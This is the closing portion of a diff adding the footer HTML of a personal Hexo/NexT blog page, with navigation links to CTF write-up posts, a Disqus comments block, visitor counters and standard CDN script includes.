+                  <i class="fa fa-chevron-left"></i> 2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Platform-NewBugku/" rel="next" title="关于新Bugku的题解">
+                  关于新Bugku的题解 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
